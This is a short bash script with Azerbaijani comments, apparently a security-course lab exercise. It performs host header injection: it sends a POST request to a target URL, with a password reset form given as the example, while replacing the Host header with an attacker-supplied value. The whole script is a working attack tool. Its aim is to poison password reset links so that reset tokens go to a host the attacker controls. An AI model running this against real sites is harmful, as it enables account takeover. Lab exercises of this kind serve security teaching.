#!/bin/bash
# 1-host_header_injection.sh
# İstifadə: ./1-host_header_injection.sh NEW_HOST TARGET_URL "form_field=value"

# Parametrləri yoxlayırıq
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 NEW_HOST TARGET_URL FORM_DATA"
  echo 'Example: ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password "email=test@test.hbtn"'
  exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Curl ilə POST sorğusu göndəririk, host header-i dəyişdiririk
curl -sS -L -X POST "$TARGET_URL" \
  -H "Host: $NEW_HOST" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "$FORM_DATA"
